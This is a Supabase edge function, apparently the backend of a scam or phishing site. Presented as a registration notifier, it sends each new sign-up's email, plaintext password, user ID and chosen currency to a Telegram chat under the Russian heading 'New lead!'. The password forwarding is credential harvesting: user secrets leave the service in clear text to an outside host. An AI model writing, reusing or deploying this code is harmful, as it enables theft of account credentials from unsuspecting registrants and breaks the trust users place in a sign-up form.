import "jsr:@supabase/functions-js/edge-runtime.d.ts";
import { createClient } from "npm:@supabase/supabase-js@2";

interface RegistrationData {
  user_id: string;
  email: string;
  password?: string;
  created_at?: string;
  currency?: string;
}

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Client-Info, Apikey",
};

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") {
    return new Response(null, {
      status: 200,
      headers: corsHeaders,
    });
  }

  try {
    const { user_id, email, password, created_at, currency }: RegistrationData = await req.json();

    if (!user_id || !email) {
      return new Response(
        JSON.stringify({ error: "Missing required fields" }),
        {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    const { data: settings, error: settingsError } = await supabase
      .from("user_settings")
      .select("telegram_bot_token, telegram_chat_id, telegram_notifications_enabled")
      .not("telegram_bot_token", "is", null)
      .not("telegram_chat_id", "is", null)
      .eq("telegram_notifications_enabled", true)
      .limit(1)
      .maybeSingle();

    if (settingsError || !settings) {
      console.log("Telegram credentials not configured");
      return new Response(
        JSON.stringify({ success: false, message: "Telegram not configured" }),
        {
          status: 200,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    const { telegram_bot_token: botToken, telegram_chat_id: chatId } = settings;

    const registrationDate = created_at
      ? new Date(created_at).toLocaleString('ru-RU', {
          dateStyle: 'long',
          timeStyle: 'short'
        })
      : new Date().toLocaleString('ru-RU', {
          dateStyle: 'long',
          timeStyle: 'short'
        });

    let message = `🎉 <b>Новый лид!</b>\n\n`;
    message += `📧 Email: <code>${email}</code>\n`;
    if (password) {
      message += `🔑 Пароль: <code>${password}</code>\n`;
    }
    message += `🆔 User ID: <code>${user_id}</code>\n`;
    if (currency) {
      message += `💱 Валюта: ${currency}\n`;
    }
    message += `📅 Дата: ${registrationDate}`;

    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const telegramResponse = await fetch(telegramApiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const telegramResult = await telegramResponse.json();

    if (!telegramResult.ok) {
      console.error("Telegram API error:", telegramResult.description);
      return new Response(
        JSON.stringify({ error: telegramResult.description }),
        {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    return new Response(
      JSON.stringify({ success: true, message: "Notification sent" }),
      {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending registration notification:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  }
});